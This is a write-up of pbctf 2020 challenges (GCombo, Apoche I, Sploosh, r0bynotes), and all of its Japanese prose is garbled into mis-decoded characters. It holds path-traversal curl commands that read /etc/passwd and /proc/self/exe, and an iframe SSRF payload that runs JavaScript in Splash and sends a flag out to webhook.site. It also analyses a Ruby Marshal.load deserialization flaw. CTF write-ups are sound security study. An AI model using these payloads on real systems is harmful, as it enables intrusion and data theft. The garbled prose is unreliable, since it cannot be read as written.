---
layout: post
title: pbctf 2020 ã® write-up
categories: [ctf]
date: 2020-12-10 18:00:00 +0900
---

12 æœˆ 5 æ—¥ã‹ã‚‰ 12 æœˆ 7 æ—¥ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ [pbctf 2020](https://ctf.perfect.blue/) ã«ã€ãƒãƒ¼ãƒ  zer0pts ã¨ã—ã¦å‚åŠ ã—ã¾ã—ãŸã€‚æœ€çµ‚çš„ã«ãƒãƒ¼ãƒ ã§ 5610 ç‚¹ã‚’ç²å¾—ã—ã€é †ä½ã¯ 1 ç‚¹ä»¥ä¸Šå¾—ç‚¹ã—ãŸ 457 ãƒãƒ¼ãƒ ä¸­ 1 ä½ã§ã—ãŸã€‚ã†ã¡ã€ç§ã¯ 5 å•ã‚’è§£ã„ã¦ 1113 ç‚¹ã‚’å…¥ã‚Œã¾ã—ãŸã€‚

ä»–ã®ãƒ¡ãƒ³ãƒãƒ¼ãŒæ›¸ã„ãŸ write-up ã¯ã“ã¡ã‚‰ã€‚

- [ctf_writeups/pbctf_2020 at master Â· msrkp/ctf_writeups](https://github.com/msrkp/ctf_writeups/tree/master/pbctf_2020)
- [PBCTF 2020 Writeups Â· A Simple Collection](https://s3v3ru5.github.io/notes/pbctf2020)
- [pbctf 2020 Writeup - CTFã™ã‚‹ã](https://ptr-yudai.hatenablog.com/entry/2020/12/09/200118)

ä»¥ä¸‹ã€ç§ã® write-up ã§ã™ã€‚

## [Misc 36] GCombo (92 solves)
> One day I spied out my friend accessing some google form to enter his secret combination lock. Afterwards, I kept bothering him about it, and he finally decided to give the link to me. Maybe you can figure out his combo for me and get a tasty flag in return:
> 
> https://docs.google.com/forms/d/e/1FAIpQLSe7sOTLHmGjmUY3iE6E7QLqeYAZDfQXsiJrz8r-ZcA_4cXNFQ/viewform
> 
> By: theKidOfArcrania

ãƒ•ã‚©ãƒ¼ãƒ ã¸ã®ãƒªãƒ³ã‚¯ãŒä¸ãˆã‚‰ã‚Œã¾ã—ãŸã€‚ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«æš—è¨¼ç•ªå·ã®å…¥åŠ›ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã—ãŸã€‚

![Enter combination code](../images/2020-12-10_gcombo1.png)

ã‚½ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã¨ã‚ã‹ã‚‹ã‚ˆã†ã«ã€å®Ÿã¯ Google Form ã§ä½œã‚‰ã‚ŒãŸãƒ•ã‚©ãƒ¼ãƒ ã§ã¯ `FB_PUBLIC_LOAD_DATA_` ã¨ã„ã†å¤‰æ•°ã«ãƒ•ã‚©ãƒ¼ãƒ å…¨ä½“ã®ãƒ‡ãƒ¼ã‚¿ãŒå…¥ã£ã¦ã„ã¾ã™ã€‚

```javascript
<script type="text/javascript" nonce="O7BNGcWK65qbkQ1GA7bH1A">var FB_PUBLIC_LOAD_DATA_ = [null,[null,[[938169490,null,null,2,[[1420416147,[["1",null,1935811336,null,0]
,["2",null,1935811336,null,0]
,["3",null,1935811336,null,0]
,["4",null,1935811336,null,0]
,["5",null,1114266997,null,0]
,["6",null,1935811336,null,0]
,["7",null,1935811336,null,0]
,["8",null,1935811336,null,0]
,["9",null,1935811336,null,0]
,["0",null,1935811336,null,0]
]
,1,null,null,null,null,null,0]
]
//...
</script>
```

`1420416147` ã¯ãŠãã‚‰ãã‚»ã‚¯ã‚·ãƒ§ãƒ³ãªã©ã® IDã€`["1",null,1935811336,null,0]` ãªã©ã®é¸æŠè‚¢ã«å«ã¾ã‚Œã¦ã„ã‚‹ `1935811336` ã¨ã„ã†ã‚ˆã†ãªæ•°å€¤ã¯ã€ãã®é¸æŠè‚¢ã‚’é¸ã‚“ã ã¨ãã«ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã® ID ã§ã—ã‚‡ã†ã€‚

`pbctf` ã§æ¤œç´¢ã—ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã« `pbctf{<digits you got along the way>_<password>}` ãŒãƒ•ãƒ©ã‚°ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚`digits you got along the way` ã¨ã„ã†ã®ã¯æš—è¨¼ç•ªå·ã§ã—ã‚‡ã†ãŒã€`password` ã¨ã„ã†ã®ã¯ãªã‚“ã§ã—ã‚‡ã†ã‹ã€‚

```javascript
["Congratulations! The flag is pbctf{\u003cdigits you got along the way\u003e_\u003cpassword\u003e}",1,0,0,0]
```

`password` ã§æ¤œç´¢ã—ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å…¥åŠ›ãƒ•ã‚©ãƒ¼ãƒ ã®ãƒ‡ãƒ¼ã‚¿ã¨æ€ã‚ã‚Œã‚‹ã‚‚ã®ãŒè¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚`s3cuR3_p1n_id_2_3v3ry0ne` ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã—ã‚‡ã†ã€‚

```javascript
[751651474,null,null,8]
,[766405565,"Password Please",null,0,[[1674649702,null,1,null,[[4,301,["s3cuR3_p1n_id_2_3v3ry0ne"]
,"Invalid password!"]
]
]
]
]
```

ã“ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å…¥åŠ›ãƒ•ã‚©ãƒ¼ãƒ ã«åˆ°é”ã§ãã‚‹ã‚ˆã†ãªæš—è¨¼ç•ªå·ã‚’ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã§æ¢ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```python
import json

with open('prog.json') as f:
  data = json.load(f)[1][1]

inv_table = {}
for i, block in enumerate(data[1:]):
  if block[3] != 2:
    continue

  nums = block[4][0][1]
  for num in nums:
    if num[2] not in inv_table:
      inv_table[num[2]] = []
    inv_table[num[2]].append({
      'num': num[0],
      'from': data[i][0]
    })

x = 751651474
res = []
while x in inv_table:
  tmp = inv_table[x][0]
  num = tmp['num']
  x = tmp['from']
  res.append(num)
print(''.join(res[::-1]))
```

```
$ python find.py
812693370
```

ã“ã®é€šã‚Šã«é¸æŠã—ã¦ã‚‚ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å…¥åŠ›ãƒ•ã‚©ãƒ¼ãƒ ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚æ‰‹ä½œæ¥­ã§ç¢ºèªã™ã‚‹ã¨ã€æœ€åˆã® `5` ãŒæŠœã‘ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚

```
pbctf{5812693370_s3cuR3_p1n_id_2_3v3ry0ne}
```

## [Web 58] Apoche I (52 solves)
> Try hacking my old version of apoche. Here are a list of running services. DM an admin if none of those work:
> 
> (URL)
> 
> Hint: There's something fishy about this apoche instance, if only there was a way to view the binary...
> 
> By: theKidOfArcrania

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚„ãƒã‚¤ãƒŠãƒªã¨ã„ã£ãŸæ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«ã¯ä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã›ã‚“ã€‚ã‚µãƒ¼ãƒãŒã‚ã¾ã‚Šã«ä¸å®‰å®šãªã®ã§ã¾ãš `wget -r` ã§ä¸€æ—¦ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãŠã“ã†ã¨è©¦ã—ã¦ã¿ãŸã¨ã“ã‚ã€`robots.txt` ã®å­˜åœ¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚å†…å®¹ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã€`/secret/` ã¨ã„ã†ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå­˜åœ¨ã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```
User-agent: *
Disallow: /secret/
```

`/secret/` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚`0.txt` ã‹ã‚‰ `5.txt` ã¾ã§ 6 ã¤ã®ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚‹ã‚ˆã†ã§ã™ãŒã€ç‰¹ã« `5.txt` ã«æ°—ã«ãªã‚‹å†…å®¹ãŒæ›¸ã„ã¦ã‚ã‚Šã¾ã—ãŸã€‚

```
2020-01-02

It's the second day of the NEW YEAER! quite exciting

I just noticed somebody was trying to access my /var/www/secret data ğŸ˜¢
so I decided to filter out '/' and '.' characters in the beginning of the path.

Maybe I should stop logging stuff here... not safe 

--
theKidOfArcrania
```

è¦æ±‚ã•ã‚ŒãŸãƒ‘ã‚¹ãŒ `/` ã¨ `.` ã‹ã‚‰å§‹ã¾ã‚‹å ´åˆã«ã¤ã„ã¦å¯¾å¿œã—ãŸã¨ã„ã†ãƒ¡ãƒ¢ãŒæ›¸ã„ã¦ã‚ã‚Šã¾ã™ã€‚Path traversal ã§ã—ã‚‡ã†ã‹ã€‚

`curl --path-as-is http://(çœç•¥)/../../../../../etc/passwd` ã®ã‚ˆã†ã« Path traversal ã‚’è©¦ã—ã¦ã¿ã¾ã—ãŸãŒã€ãƒ¡ãƒ¢ã«æ›¸ã‹ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«å¯¾ç­–ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã§ 404 ãŒè¿”ã£ã¦ãã¾ã™ã€‚

ãŸã ã€`/secret/` ã®ã‚ˆã†ã«å®Ÿéš›ã«å­˜åœ¨ã—ã¦ã„ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‹ã‚‰ `../` ã§ã•ã‹ã®ã¼ã£ã¦ã„ãå ´åˆã«ã¤ã„ã¦ã¯ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚è©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ curl --path-as-is http://(çœç•¥)/secret/../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

`/etc/passwd` ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚

å•é¡Œæ–‡ã®ãƒ’ãƒ³ãƒˆã‚’è¦‹ã‚‹ã«ã€ã‚ã¨ã¯ã“ã® Web ã‚µãƒ¼ãƒã®ãƒã‚¤ãƒŠãƒªã‚’å–å¾—ã™ã‚Œã°ã‚ˆã•ãã†ã§ã™ã€‚`/proc/self/exe` ã‚’è©¦ã—ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
$ curl --path-as-is http://(çœç•¥)/secret/../../../../../proc/self/exe 2>&1 | strings | grep pbctf
Btw, the first flag is pbctf{n0t_re4lly_apache_ap0che!}
```

```
pbctf{n0t_re4lly_apache_ap0che!}
```

## [Web 156] Sploosh (76 solves)
> I wanted to make my own URL scraper, but parsing HTML is hard, so I used some random open source scraping project instead.
> 
> (URL)
> 
> By: Corb3nik

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã« URL ã®å…¥åŠ›ãƒ•ã‚©ãƒ¼ãƒ ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚URL ã‚’å…¥åŠ›ã—ã¦é€ä¿¡ã™ã‚‹ã¨ã‚¹ã‚¯ãƒ¬ã‚¤ãƒ”ãƒ³ã‚°ã•ã‚Œã€ç”»é¢ã‚µã‚¤ã‚ºã®æƒ…å ±ã ã‘ãŒè¿”ã£ã¦ãã‚‹ã‚ˆã†ã§ã™ã€‚ãã®æƒ…å ±ã„ã‚‹ã‹ãªã€‚

![Sploosh](../images/2020-12-10_sploosh1.png)

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚‚ã¤ã„ã§ã«é…å¸ƒã•ã‚Œã¦ã„ã¾ã™ã€‚ã¾ãš `docker-compose.yml` ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€[Splash](https://github.com/scrapinghub/splash) ã¨ã‚ˆã°ã‚Œã‚‹ Web ã‚¹ã‚¯ãƒ¬ã‚¤ãƒ”ãƒ³ã‚°ç”¨ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒå‹•ã„ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```yaml
version: "3.8"
services:
  webapp:
    build: .
    env_file:
      - ./flag.env
    networks:
      sploosh_internal:
        ipv4_address: 172.16.0.14

    ports:
      - 9000:80
    volumes:
      - ./src:/var/www/html/:ro

  splash:
    image: scrapinghub/splash
    networks:
      sploosh_internal:
        ipv4_address: 172.16.0.13
```

`webapp` ã«ã¤ã„ã¦ã¯ã€`index.php`ã€`api.php`ã€`flag.php` ã® 3 ã¤ã® PHP ãƒ•ã‚¡ã‚¤ãƒ«ãŒ Web ã‚µãƒ¼ãƒä¸Šã«å±•é–‹ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚`flag.php` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã€`webapp` ã‚‚ã—ãã¯ `splash` ã®ã¿ã‹ã‚‰é–²è¦§å¯èƒ½ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

URL ã®å…¥åŠ›ãƒ•ã‚©ãƒ¼ãƒ ã« `http://webapp/flag.php` ã‚’å…¥åŠ›ã™ã‚Œã° OK ã§ã¯? ã¨æ€ã£ã¦ã—ã¾ã„ã¾ã™ãŒã€`0,0,1024,768` ã®ã‚ˆã†ã«ç”»é¢ã‚µã‚¤ã‚ºã ã‘å¾—ã‚‰ã‚Œã¦ã‚‚æ„å‘³ãŒã‚ã‚Šã¾ã›ã‚“ã€‚

```php
<?php

$FLAG = getenv("FLAG");

$remote_ip = $_SERVER['REMOTE_ADDR'];
if ($remote_ip === "172.16.0.13" || $remote_ip === '172.16.0.14') {
  echo $FLAG;
} else {
  echo "No flag for you :)";
}
?>
```

`api.php` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚`http://splash:8050/render.json` ã¨ã„ã† Splash ã® API ã‚’å©ã„ã¦ã„ã¾ã™ã€‚GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®æ“ä½œã‚‚ã§ãã‚‹ã®ã§ã¯ãªã„ã‹ã¨è€ƒãˆã¾ã—ãŸãŒã€`$_GET['url']` ã¯ `urlencode` ã«é€šã•ã‚Œã¦ã„ã‚‹ã®ã§ã§ãã¾ã›ã‚“ã€‚

```php
<?php
error_reporting(0);

header("Content-Type: application/json");

function fail() {
  echo "{}";
  die();
}

if (!isset($_GET['url'])) {
  fail();
}


$url = $_GET['url'];

if ($url === '') {
  fail();
}

try {
  $json = file_get_contents("http://splash:8050/render.json?timeout=1&url=" . urlencode($url));
  $out = array("geometry" => json_decode($json)->geometry);
  echo json_encode($out);
} catch(Exception $e) {
  fail();
}
?>
```

è„†å¼±æ€§ãªã‚“ã¦ãªã„ã®ã§ã¯â€¦? ã¨æ€ã£ã¦ã—ã¾ã„ã¾ã™ãŒã€`api.php` ã¯å¤–éƒ¨ã® URL ã®å…¥åŠ›ã‚‚è¨±ã—ã¦ã„ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¾ã™ã€‚`<img src="http://splash:8050/â€¦">` ã¨ã„ã†ã‚ˆã†ãª HTML ã‚’è¿”ã™å¤–éƒ¨ã® Web ã‚µãƒ¼ãƒã® URL ã‚’å…¥åŠ›ã™ã‚Œã°ã€CSRF ã«ã‚ˆã£ã¦ `api.php` ã‚’çµŒç”±ã›ãš Splash ã«ã‚¹ã‚¯ãƒ¬ã‚¤ãƒ”ãƒ³ã‚°ã•ã›ã‚‹ã“ã¨ãŒã§ããªã„ã§ã—ã‚‡ã†ã‹ã€‚

`<img src="http://splash:8050/render.json?url=https://webhook.site/...">` ã¨ã„ã†ã‚ˆã†ãª HTML ã§è©¦ã—ã¦ã¿ã‚‹ã¨ã€`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) splash Version/10.0` ã¨ã„ã† User-Agent ã‚’æŒã¤ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ¥ã¾ã—ãŸã€‚ã©ã†ã‚„ã‚‰ CSRF ã§ãã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚

CSRF ã«ã‚ˆã£ã¦ãªã«ã‹æ‚ªã„ã“ã¨ãŒã§ããªã„ã‹ Splash ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‘¼ã‚“ã§ã„ã‚‹ã¨ã€[`/render.html`](https://splash.readthedocs.io/en/stable/api.html#render-html) ã¨ã„ã†ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§ã¯ `js_source` ã¨ã„ã† GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä¸ãˆã‚‹ã¨ã€ã‚¹ã‚¯ãƒ¬ã‚¤ãƒ”ãƒ³ã‚°å¯¾è±¡ã®ãƒšãƒ¼ã‚¸ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ JavaScript ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚

ã‚ã¨ã¯ã‚„ã‚‹ã ã‘ã§ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ãª HTML ã‚’è¿”ã™ Web ã‚µãƒ¼ãƒã® URL ã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãƒ•ãƒ©ã‚°ã‚’ GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦æŒã£ãŸ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé£›ã‚“ã§ãã¾ã—ãŸã€‚

```html
<iframe src="http://splash:8050/render.html?url=http://webapp/flag.php&js_source=a=new%20XMLHttpRequest,a.open(`GET`,`/flag.php`,false),a.send(null),document.body.innerHTML+=[String.fromCharCode(60),`img%20src=https://webhook.site/...?${encodeURIComponent(a.responseText)}`,String.fromCharCode(62)].join(String())"></iframe>
```

```
pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}
```

ã„ã„ãˆâ€¦ã€‚

## [Web 420] r0bynotes (4 solves)
> Rails is secure by default so it's perfect for my amazing notes app
> 
> (URL)
> 
> Note: If you find the flag, please remove the `flag{..}` wrapper and wrap it with `pbctf{...}` instead
> 
> By: vakzz
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: dist.zip

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒãƒ¼ãƒˆã¨ãƒ¦ãƒ¼ã‚¶ã®ä½œæˆãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ³ã‚¯ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

![r0bynotes](../images/2020-12-10_r0bynotes1.png)

ãƒãƒ¼ãƒˆã®ä½œæˆã®å ´åˆã«ã¯ã€ä½œè€…ã¨å†…å®¹ã‚’å…¥åŠ›ã™ã‚‹ã¨ `/notes/ec8b7effe5970ba18313eb968718b862` ã¨ã„ã†ã‚ˆã†ãª URL ã«é·ç§»ã—ã€å…¥åŠ›ã—ãŸå†…å®¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ã®ä½œæˆã®å ´åˆã«ã¯ã€ãƒ¦ãƒ¼ã‚¶åã¨åå‰ã‚’å…¥åŠ›ã™ã‚‹ã¨ `/users/usernamedb980f0ff514db35feb36b9b48a0aa39` ã®ã‚ˆã†ãª URL ã«é·ç§»ã—ã€å…¥åŠ›ã—ãŸå†…å®¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒæ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦ä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚`Gemfile` ã‚’è¦‹ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã« Ruby 2.7.2 ã¨ Ruby on Rails 6.1.0 ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```
source 'https://rubygems.org'
git_source(:github) { |repo| "https://github.com/#{repo}.git" }

ruby '2.7.2'

# Bundle edge Rails instead: gem 'rails', github: 'rails/rails'
gem 'rails', '~> 6.1.0.rc1'
# Use sqlite3 as the database for Active Record
gem 'sqlite3', '~> 1.4'
# Use Puma as the app server
gem 'puma', '~> 5.0'
# Use SCSS for stylesheets
gem 'sass-rails', '>= 6'
# Use Active Model has_secure_password
# gem 'bcrypt', '~> 3.1.7'

group :development, :test do
  # Call 'byebug' anywhere in the code to stop execution and get a debugger console
  gem 'byebug', platforms: [:mri, :mingw, :x64_mingw]
end

group :development do
  gem 'listen', '~> 3.2'
end

# Windows does not include zoneinfo files, so bundle the tzinfo-data gem
gem 'tzinfo-data', platforms: [:mingw, :mswin, :x64_mingw, :jruby]

gem 'redis'
```

ãƒ•ãƒ©ã‚°ã®å ´æ‰€ã«ã¤ã„ã¦ã‚‚ç¢ºèªã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚`Dockerfile` ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã« `/read_file` ã¨ `/flag.txt` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒå­˜åœ¨ã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

`/read_file` ã¯ `/flag.txt` ã‚’èª­ã‚“ã§å‡ºåŠ›ã™ã‚‹ã ã‘ã®ãƒã‚¤ãƒŠãƒªã§ã™ã€‚`/flag.txt` ãŒ `chmod 400` ã•ã‚Œã¦ãŠã‚Šã€ã¾ãŸ `/read_flag` ã¯ SUID ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‹ã‚‰ã€`/read_flag` ã‚’å®Ÿè¡Œã—ã¦ãã®å‡ºåŠ›ã‚’å¾—ã‚‹ã®ãŒã“ã®å•é¡Œã®ç›®æ¨™ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```
FROM ruby:2.7.2

#...

COPY ./flag.txt /flag.txt
RUN chmod 400 /flag.txt

COPY ./read_flag /read_flag
RUN chmod 4555 /read_flag

#...

# comment out for dev mode
ENV RAILS_ENV production

# Start the main process.
CMD ["rails", "server", "-b", "0.0.0.0"]
```

### Insecure Deserialization ã—ãŸã„
`app/models/note.rb` ã¨ `app/controllers/notes_controller.rb` ã§ãƒãƒ¼ãƒˆã®ä½œæˆæ™‚ã¨é–²è¦§æ™‚ã«ã©ã®ã‚ˆã†ãªå‡¦ç†ãŒè¡Œã‚ã‚Œã¦ã„ã‚‹ã‹ç¢ºèªã—ã¾ã—ã‚‡ã†ã€‚

ã¾ãšä½œæˆæ™‚ã«ã¤ã„ã¦è¦‹ã¦ã¿ã‚‹ã¨ã€`create` ãƒ¡ã‚½ãƒƒãƒ‰ã‹ã‚‰å‘¼ã³å‡ºã•ã‚ŒãŸ `new_note` ãƒ¡ã‚½ãƒƒãƒ‰ã§ `Note` ã¨ã„ã†ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã—ã¦ 32 æ–‡å­—ã®ãƒ©ãƒ³ãƒ€ãƒ ãª hex æ–‡å­—åˆ—ã‚’ `@id` ã«ã€ä½œè€…ã¨å†…å®¹ã«ã¤ã„ã¦ã‚‚ `valid_attributes?` ãƒ¡ã‚½ãƒƒãƒ‰ã«ã‚ˆã£ã¦ã‚ã‚‰ã‹ã˜ã‚æ–‡å­—åˆ—ã‚’ãƒã‚§ãƒƒã‚¯ã—ãŸä¸Šã§ãã‚Œãã‚Œ `@author` ã¨ `@body` ã«è¨­å®šã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’ `Marshal.dump` ã«ã‚ˆã£ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã¦ã€`/notes/(ID)` ã‚’ã‚­ãƒ¼ã¨ã—ã¦ `Rails.cache` ã«ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã—ã¦ã„ã¾ã™ã€‚

é–²è¦§æ™‚ã«ã¤ã„ã¦è¦‹ã¦ã¿ã‚‹ã¨ã€`show` ãƒ¡ã‚½ãƒƒãƒ‰ã‹ã‚‰å‘¼ã³å‡ºã•ã‚ŒãŸ `existing_note` ãƒ¡ã‚½ãƒƒãƒ‰ã§ URL ã®ãƒ‘ã‚¹ã¨ã—ã¦ä¸ãˆã‚‰ã‚ŒãŸã‚­ãƒ¼ã‚’ä½¿ã£ã¦ `Rails.cache` ã‹ã‚‰ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸå€¤ã‚’å–å¾—ã—ã€`Marshal.load` ã«ã‚ˆã£ã¦ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã¦ã„ã¾ã™ã€‚

```ruby
# app/models/note.rb
class Note
    attr_accessor :author, :body, :date, :id

    def initialize(author:, body:, date: Time.now)
        @id = SecureRandom.hex
        @author = author
        @body = body
        @date = date
    end
end
```

```ruby
# app/controllers/notes_controller.rb
class NotesController < ApplicationController
    before_action :note_exists?, only: :show
    before_action :valid_note_id?, only: :show
    before_action :valid_attributes?, only: :create

    def new
    end

    def show
        existing_note
    end

    def create
        Rails.cache.write("/notes/#{new_note.id}", Marshal.dump(new_note), expires_in: 5.minutes)
        redirect_to action: "show", id: new_note.id
    end

    private

    def note_id
        @note_id ||= params[:id]
    end

    def note_data
        @note_data ||= Rails.cache.read("/notes/#{note_id}")
    end

    def existing_note
        @existing_note ||= Marshal.load(note_data)
    end

    def note_params
        @note_params ||= params.require(:note).permit(:author, :body)
    end

    def new_note
        @new_note ||= Note.new(**note_params.to_h.symbolize_keys)
    end

    def valid_note_id?
        raise ActionController::BadRequest.new("invalid note id") if note_id&.count("^a-z0-9") > 0
    end

    def note_exists?
        raise ActionController::RoutingError.new("note not found") unless note_data
    end

    def valid_attributes?
        raise ActionController::BadRequest.new("invalid attributes") if note_params[:author].length + note_params[:body].length > 500
    end

end
```

`Marshal.load` ã¨ã„ãˆã° Insecure Deserialization ã§ã™ã€‚ä»¥ä¸‹ã® 2 æœ¬ã®è¨˜äº‹ã‚’èª­ã‚ã°ã‚ã‹ã‚‹ã‚ˆã†ã«ã€Ruby ã«ã‚‚ Ruby on Rails ã«ã‚‚ Insecure Deserialization ã«ä½¿ãˆã‚‹ gadget ãŒè±Šå¯Œã«å­˜åœ¨ã—ã¦ãŠã‚Šã€RCE å¯èƒ½ãª gadget chain ãŒè¦‹ã¤ã‹ã£ã¦ã„ã¾ã™ã€‚

- Ruby on Rails: [Attacking Ruby on Rails Applications - Phrack Magazine](http://phrack.org/issues/69/12.html)
- Ruby: [Ruby 2.x Universal RCE Deserialization Gadget Chain](https://www.elttam.com/blog/ruby-deserialization/)

ã“ã®å•é¡Œã§ã‚‚ä½¿ãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€Rails ã®ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã« `/notes/...` ã¨ã„ã†ã‚ˆã†ãªã‚­ãƒ¼ã§ä»»æ„ã®å†…å®¹ã‚’ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã›ã‚‹ã“ã¨ãŒã§ããªã‘ã‚Œã°ç™ºç«ã•ã›ã‚‰ã‚Œã¾ã›ã‚“ã€‚`app/controllers/notes_controller.rb` ã«ã¯ãã®ã‚ˆã†ãªã“ã¨ãŒã§ããã†ãªå‡¦ç†ã¯è¦‹å½“ãŸã‚Šã¾ã›ã‚“ã€‚

